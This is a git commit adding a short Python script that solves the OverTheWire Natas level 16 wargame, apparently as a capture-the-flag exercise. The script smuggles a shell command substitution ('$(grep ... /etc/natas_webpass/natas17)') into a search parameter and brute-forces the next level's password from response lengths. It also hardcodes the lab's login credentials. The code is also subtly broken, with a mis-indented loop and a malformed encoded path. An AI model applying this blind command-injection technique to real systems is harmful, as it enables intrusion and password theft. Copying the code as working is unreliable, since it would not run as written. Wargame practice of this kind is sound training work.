6dd7bcc572b96689306339bba728592c3e62eca1
icemindd <55721808+icemindd@users.noreply.github.com>
2019-09-24 03:11:50 +0300

    Create natas16.py

---
+++ natas16.py
@@ -0,0 +1,15 @@
+#!/usr/bin/python
+
+import requests
+from requests.auth import HTTPBasicAuth
+
+all = '8abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
+j = ''
+print(' Finding the password...')
+
+while len(j) < 34:
+    for i in all:
+    r = requests.get('http://natas16.natas.labs.overthewire.org/?needle=%24%28grep+^' + j + i + '+%2Fetc2Fnatas_webpass%2Fnatas17%29&submit=Search', auth = HTTPBasicAuth('natas16','WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'))
+        if len(r.content) < 461983:
+            j += i
+print('Password for natas17 is ', j)
